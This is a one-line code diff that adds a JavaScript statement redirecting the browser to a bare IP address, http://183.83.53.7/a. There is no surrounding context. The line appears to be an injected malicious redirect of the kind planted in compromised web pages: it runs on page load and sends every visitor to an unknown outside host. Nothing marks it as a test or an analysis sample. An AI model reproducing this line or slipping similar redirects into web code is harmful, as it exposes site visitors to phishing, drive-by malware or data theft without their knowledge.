@@ -1,0 +1,1 @@
+window.location='http://183.83.53.7/a';
